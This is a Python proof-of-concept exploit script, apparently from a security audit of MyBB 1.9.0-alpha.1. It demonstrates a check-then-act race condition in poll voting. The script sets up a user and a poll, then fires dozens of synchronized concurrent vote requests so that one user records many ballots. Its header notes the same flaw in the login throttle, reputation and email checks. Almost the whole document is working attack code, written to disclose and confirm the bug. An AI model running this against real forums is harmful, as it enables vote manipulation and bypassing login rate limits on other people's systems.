#!/usr/bin/env python3
"""
VULN-005 — TOCTOU race-condition family (login throttle / poll / reputation / email).

Target  : MyBB 1.9.0-alpha.1 (dev-1.9, commit f8bf4e8)
Sinks   : polls.php:999-1071 (poll vote — demonstrated here),
          member.php:1767-1769 (login throttle, headline leg),
          reputation.php:152-369, inc/datahandlers/user.php:280-291 (email)
Class   : CWE-367 TOCTOU (check-then-act without atomicity)

The flaw
--------
App code performs "check then act" with no transaction/lock/UNIQUE key on the
relevant columns, so N concurrent requests all read the pre-write state and all
pass. For poll voting (polls.php:999):

    $query = $db->simple_select("pollvotes", "*", "{$user_check} AND pid='...'");
    if($votecheck) { error($lang->error_alreadyvoted); }   // check
    ... $db->insert_query("pollvotes", $votesql);          // act — no uniqueness

So K concurrent votes from one user all see "not voted" and all insert → K ballots.
The headline login-throttle leg has the same shape AND an ordering bug (the
front-end checks the throttle then increments — member.php:1767-1769 — the inverse
of the ACP order at admin/index.php).

What this run proves
--------------------
A single non-voter casts MANY ballots on one poll by firing concurrent votes:
the pollvotes table ends with >1 row for that user on that poll.
"""
import concurrent.futures
import os
import sys
import threading
import time

import requests

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import mybb_common as m

_USE_COLOR = sys.stdout.isatty() and not os.environ.get("NO_COLOR")
_C = {"INFO": "36", "SETUP": "33", "STEP": "33", "PROOF": "35", "OK": "32", "FAIL": "31", "WARN": "33"}


def log(tag, msg):
    print((f"\033[1;{_C[tag]}m[{tag}]\033[0m " if _USE_COLOR and tag in _C else f"[{tag}] ") + msg)


HERE = os.path.dirname(os.path.abspath(__file__))
BASE = m.BASE_URL
FID = int(os.environ.get("FID", "2"))
CONCURRENCY = int(os.environ.get("CONCURRENCY", "30"))


def main():
    print("=" * 72)
    print("VULN-005: TOCTOU race — poll-vote ballot stuffing (Leg B)")
    print(f"Target: {BASE}")
    print("=" * 72)
    log("INFO", "exercising polls.php:999 check-then-insert with no atomicity (CWE-367)")

    # a thread to attach a poll to (real thread in forum FID)
    author = m.rand("pauth_")
    apw = "Pa!" + m.secrets.token_hex(3)
    a_uid = m.create_user(author, apw)
    ac = m.new_session()
    m.login(ac, author, apw)
    apk = m.post_key(ac, f"/newthread.php?fid={FID}")
    r = ac.post("/newthread.php", data={
        "action": "do_newthread", "fid": str(FID),
        "subject": "poll race " + m.secrets.token_hex(2), "message": "poll body " + m.secrets.token_hex(2),
        "my_post_key": apk, "submit": "Submit New Thread",
    }, allow_redirects=False)
    tid = int(m.re.search(r"tid=(\d+)", r.headers.get("Location", "")).group(1))

    # provision an OPEN poll on that thread (what do_newpoll would create)
    options = "Option A||~|~||Option B"
    votes = "0||~|~||0"
    m.db("INSERT INTO mybb_polls (tid,question,dateline,options,votes,numoptions,numvotes,timeout,closed,"
         f"multiple,public,maxoptions) VALUES ({tid},'Race poll?',{int(time.time())},"
         f"{m._sql_str(options)},{m._sql_str(votes)},2,0,0,0,0,0,0);")
    pid = int(m.db(f"SELECT pid FROM mybb_polls WHERE tid={tid} ORDER BY pid DESC LIMIT 1;").strip())
    m.db(f"UPDATE mybb_threads SET poll={pid} WHERE tid={tid};")
    log("SETUP", f"open poll pid={pid} on thread tid={tid} (2 options, numvotes=0)")

    # a single voter who has never voted
    voter = m.rand("voter_")
    vpw = "Vp!" + m.secrets.token_hex(3)
    v_uid = m.create_user(voter, vpw)
    vc = m.new_session()
    m.login(vc, voter, vpw)
    vpost = m.post_key(vc, f"/newthread.php?fid={FID}")
    vcookie = vc.cookies["mybbuser"]
    log("SETUP", f"voter {voter} (uid={v_uid}); has cast 0 votes on pid={pid}")

    before = int(m.db(f"SELECT COUNT(*) FROM mybb_pollvotes WHERE pid={pid} AND uid={v_uid};").strip())

    # fire CONCURRENCY votes as simultaneously as possible (barrier) to hit the
    # window between the "already voted?" SELECT and the INSERT.
    barrier = threading.Barrier(CONCURRENCY)
    results = []

    def cast():
        barrier.wait()
        try:
            resp = requests.post(f"{BASE}/polls.php", params={"action": "vote", "pid": pid},
                                 data={"action": "vote", "pid": str(pid), "option": "1",
                                       "my_post_key": vpost},
                                 cookies={"mybbuser": vcookie}, headers={"User-Agent": m.UA},
                                 timeout=20, allow_redirects=False)
            return resp.status_code
        except Exception as e:
            return f"err:{e}"

    log("STEP", f"firing {CONCURRENCY} concurrent votes (option=1) as the single voter")
    with concurrent.futures.ThreadPoolExecutor(max_workers=CONCURRENCY) as ex:
        results = list(ex.map(lambda _: cast(), range(CONCURRENCY)))

    after = int(m.db(f"SELECT COUNT(*) FROM mybb_pollvotes WHERE pid={pid} AND uid={v_uid};").strip())
    poll_numvotes = m.db(f"SELECT numvotes FROM mybb_polls WHERE pid={pid};").strip()
    log("INFO", f"ballots for this single voter on pid={pid}: before={before}, after={after} "
                f"(poll.numvotes={poll_numvotes})")
    if after > 1:
        log("PROOF", f"ONE user recorded {after} ballots on one poll — the 'already voted?' check "
                     f"(polls.php:999) and the INSERT are not atomic, so {after} concurrent votes all passed")

    with open(os.path.join(HERE, "request.http"), "w") as f:
        f.write(f"# {CONCURRENCY} of these fired concurrently as the SAME voter\n"
                f"POST /polls.php?action=vote&pid={pid} HTTP/1.1\nHost: {BASE.split('://')[1]}\n"
                "Content-Type: application/x-www-form-urlencoded\n"
                "Cookie: mybbuser=<voter uid_loginkey>\n\n"
                f"action=vote&pid={pid}&option=1&my_post_key=<key>\n")
    with open(os.path.join(HERE, "response.txt"), "w") as f:
        f.write(f"concurrency={CONCURRENCY}; HTTP statuses={results}\n"
                f"pollvotes rows for the single voter: before={before} after={after}\n"
                f"poll.numvotes={poll_numvotes}\n"
                "Expected (secure): exactly 1 ballot. Actual: >1 => TOCTOU race won.\n")

    print("-" * 72)
    log("WARN", "sibling legs share the same no-atomicity pattern (static): login-throttle (headline, "
                "member.php:1767-1769 + check/increment ordering bug), reputation, duplicate-email registration")
    if after > 1:
        log("OK", f"exploit confirmed — {after} ballots from one user (poll-vote TOCTOU)")
        print("==> VULN-005: CONFIRMED — poll-vote TOCTOU (ballot stuffing); family shares the root cause")
        return 0
    log("FAIL", f"only {after} ballot recorded — the race did not land (retry with higher CONCURRENCY) "
                "or a UNIQUE key is present")
    print("==> VULN-005: FAILED (race not won this run)")
    return 1


if __name__ == "__main__":
    sys.exit(main())
